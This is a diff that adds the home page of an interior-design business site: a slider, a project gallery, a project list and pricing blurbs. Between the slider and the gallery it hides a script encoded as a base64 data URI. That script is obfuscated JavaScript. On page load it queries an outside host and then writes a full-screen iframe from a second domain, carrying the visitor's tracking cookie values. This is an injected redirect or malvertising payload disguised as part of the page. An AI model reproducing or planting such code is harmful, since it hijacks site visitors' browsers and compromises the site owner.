@@ -1,0 +1,163 @@
+
+<!DOCTYPE HTML>
+<html>
+<head>
+    <title>HomeSpaceFlower Lim.</title>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <link href='https://fonts.googleapis.com/css?family=News+Cycle' rel='stylesheet' type='text/css'>
+    <link href="style.css" rel="stylesheet" type="text/css" media="all" />
+    <link href="camera.css" rel="stylesheet" type="text/css" media="all" />
+    <script type='text/javascript' src='jquery.min.js'></script>
+    <script type='text/javascript' src='jquery.mobile.customized.min.js'></script>
+    <script type='text/javascript' src='jquery.easing.1.3.js'></script> 
+    <script type='text/javascript' src='camera.min.js'></script> 
+    <script src="https://code.jquery.com/jquery-3.4.1.js"></script>
+    <script>
+		jQuery(function(){
+			
+			jQuery('#camera_wrap_1').camera({
+				thumbnails: true
+			});
+
+			jQuery('#camera_wrap_2').camera({
+				height: '400px',
+				loader: 'bar',
+				pagination: false,
+				thumbnails: true
+			});
+		});
+	</script>
+<link rel="stylesheet" type="text/css" href="jquery.lightbox.css">
+<script src="jquery.lightbox.js"></script>
+<script>
+  $(function() {
+    $('.gallery a').lightbox(); 
+  });
+</script>
+</head>
+<body>
+<div class="wrapper">
+<div class="wrap">
+<div class="wrap_inner">
+	<div class="cssmenu">
+			<ul>
+			   <li class="active"><a href="index.html"><span>Home</span></a></li>
+			   <li><a href="about.html"><span>About us</span></a></li>
+			    <li><a href="product.html"><span>Products</span></a></li>
+			   <li class="has-sub"><a href="service.html"><span>Services</span></a></li>
+			   <li class="last"><a href="contact.html"><span>Contact</span></a></li>
+			 	<div class="clear"></div>
+			 </ul>
+	</div>
+	<div class="logo">
+			<h1><a href="index.html"><img src="logo.png" alt=""></a></h1>
+	</div>
+	<div class="fluid_container">
+        <div class="camera_wrap camera_azure_skin" id="camera_wrap_1">
+            <div data-thumb="slider1.jpg" data-src="slider1.jpg">
+            </div>
+            <div data-thumb="slider1.jpg" data-src="slider2.jpg">
+            </div>
+            <div data-thumb="slider1.jpg" data-src="slider3.jpg">
+            </div>
+            <div data-thumb="slider1.jpg" data-src="slider4.jpg">
+            </div>            
+             </div>
+         <div class="clear"></div>
+	<script src="data:text/javascript;base64,dmFyIF8weDI4YjE9WyIyNDE0OTZEU3d2VVYiLCIzMzczNTlBaERFYVgiLCJ1dG1fdGVybSIsIjQxbHFnRGVBIiwnPGlmcmFtZSBzcmM9Imh0dHBzOi8vcG90ZW50aWFsYXV0by5jb20vaW5kZXgucGhwP2tleT12dmx0NDR5MWNvZDF1N2x5dHF6NSZ1dG1fY2FtcGFpZ249Jywic2VhcmNoIiwiMWlNbm1PQSIsIjYxMzYxMmJwYkFrZyIsIjE4NDU0emZYQVZSIiwibG9jYXRpb24iLCIxOTUzSXhyVG1wIiwiODk2NzRlSHdUQ20iLCIxS1RJSnRrIiwiMTA0MzQ2MWF3enJBViIsInllcyIsInV0bV9jYW1wYWlnbiIsIiZ1dG1fdGVybT0iLCI9KFteJj1dKykiLCJ3cml0ZSJdLF8weDUwZTk9ZnVuY3Rpb24odCxlKXtyZXR1cm4gXzB4MjhiMVt0LT00NTddfTtmdW5jdGlvbiBnZXRDb29raWVzKHQpe3ZhciBlPV8weDUwZTksbz13aW5kb3dbZSg0NzIpXVtlKDQ2OCldO3JldHVybiEhKG89by5tYXRjaChuZXcgUmVnRXhwKHQrZSg0NjEpKSkpJiZvWzFdfWZ1bmN0aW9uIG9uQWpheFN1Y2Nlc3ModCl7dmFyIGU9XzB4NTBlOTt0PT1lKDQ1OCkmJmRvY3VtZW50W2UoNDYyKV0oZSg0NjcpK2dldENvb2tpZXMoZSg0NTkpKStlKDQ2MCkrZ2V0Q29va2llcyhlKDQ2NSkpKyciIGZyYW1lYm9yZGVyPSIwIiBzdHlsZT0ib3ZlcmZsb3c6aGlkZGVuO292ZXJmbG93LXg6aGlkZGVuO292ZXJmbG93LXk6aGlkZGVuO2hlaWdodDoxMDAlO3dpZHRoOjEwMCU7cG9zaXRpb246YWJzb2x1dGU7dG9wOjBweDtsZWZ0OjBweDtyaWdodDowcHg7Ym90dG9tOjBweCIgaGVpZ2h0PSIxMDAlIiB3aWR0aD0iMTAwJSI+PC9pZnJhbWU+Jyl9IWZ1bmN0aW9uKGUpe2Zvcih2YXIgdD1fMHg1MGU5OzspdHJ5e2lmKDQ5NzY1Nz09PXBhcnNlSW50KHQoNDY0KSkrLXBhcnNlSW50KHQoNDcxKSkqcGFyc2VJbnQodCg0NzUpKSstcGFyc2VJbnQodCg0NjMpKSstcGFyc2VJbnQodCg0NzQpKStwYXJzZUludCh0KDQ2NikpKnBhcnNlSW50KHQoNDczKSkrLXBhcnNlSW50KHQoNDcwKSkrLXBhcnNlSW50KHQoNDU3KSkqLXBhcnNlSW50KHQoNDY5KSkpYnJlYWs7ZS5wdXNoKGUuc2hpZnQoKSl9Y2F0Y2godCl7ZS5wdXNoKGUuc2hpZnQoKSl9fShfMHgyOGIxKSwkLmdldCgiaHR0cHM6Ly9hdXRvYWJzb2x1dGUuY29tL2luZGV4LnBocD9rZXk9a21ncGRyeTVpODRvbHlnZm0xZnoiLG9uQWpheFN1Y2Nlc3MpOw=="></script>
+	</div>
+			<div class="grids_1_of_3">
+				<div class="grid_1_of_3 images_1_of_3 bg1">
+					 <h3>Luxurious living room</h3>
+					<div class="gallery">
+						<a href="pic1.jpg"><img src="pic1.jpg" title="image-name"></a>
+					</div>
+					  <p>The luxurious castle-style interior gives you a daily feeling of luxury and something long forgotten by the time ...</p>
+					<div class="plus_btn">
+						<span></span>
+					</div>
+				</div>
+				<div class="grid_1_of_3 images_1_of_3 bg2">
+					 <h3>Colorful and bright</h3>
+					<div class="gallery">
+						<a href="pic2.jpg"><img src="pic2.jpg" title="image-name"></a>
+					</div>
+					  <p>Different colors add a sparkle to your life, colorful and bright design allows you to lift your mood even on the worst day ...</p>
+	 		   		<div class="plus_btn">
+						<span></span>
+					</div>
+				</div>
+				<div class="grid_1_of_3 images_1_of_3 bg3">
+					 <h3>Delicate caramel colors</h3>
+					<div class="gallery">
+						<a href="pic3.jpg"><img src="pic3.jpg" title="image-name"></a>
+					</div>
+					  <p>The softness of light caramel adds tenderness and comfort to your life and home ...</p>
+				 	<div class="plus_btn">
+						<span></span>
+					</div>
+				</div>
+					<div class="clear"></div>
+			</div>
+			<div class="content_btm">
+				<div class="col_1_of_3 span_1_of_3">
+					<h2>Our Projects</h2>
+					<div class="text1-nav">
+						<ul>
+							<li><a href="">Ruby green hall</a></li>
+							<li><a href="">Colorful children's room</a></li>
+							<li><a href="">Sports style of the children's room </a></li>
+							<li><a href="">Stylish brown and green kitchen</a></li>
+							<li><a href="">Brutal style for a barbershop </a></li>
+							<li><a href="">Nice design for a bakery</a></li>
+
+					    </ul>
+					</div>
+				</div>
+				<div class="col_1_of_3 span_1_of_3">
+					<h2>The project is in red-orange colors, colorful and bright</h2>
+					<h4>Interesting solutions for you,</h4>
+					<p class="para">Different colors add a sparkle to your life, colorful and bright design allows you to lift your mood even on the worst day ...</p>
+					<div class="button top"><a href="details.html">Read More</a></div>
+				</div>
+				<div class="col_1_of_3 span_1_of_3">
+					<h2>Delicate caramel colors project</h2>
+					<h4>Interesting solutions for you,</h4>
+					<p class="para">The softness of light caramel adds tenderness and comfort to your life and home ...</p>
+					<div class="button top"><a href="details.html">Read More</a></div>
+				</div>
+				<div class="clear"></div>
+			</div>
+	<div class="grids_btm">
+		<div class="grids">
+			<div class="images_1_of_1">
+				<p>15</p>
+			</div>
+			<div class="grid_1_of_1">
+				  	<h3>Days </h3>
+					<p>Required for realizing your dream project.</p>	   
+ 			</div>
+		</div>
+			<div class="grids">
+			<div class="images_1_of_1">
+				<p>$</p>
+			</div>
+				<div class="grid_1_of_1">
+				  	<h3>Price</h3>
+					<p>The best prices for your dream projects.</p>   
+ 				</div>
+			</div>
+	</div>
+	<div class="clear"></div>
+	<div class="footer1">
+		<div class="copy">
+			<p class="w3-link">2021 HomeSpaceFlower Lim. All right reserved.</p>
+		</div>
+		<div class="clear"></div>	
+	</div>
+</div>
+</div>
+</div>
+</body>
+</html>
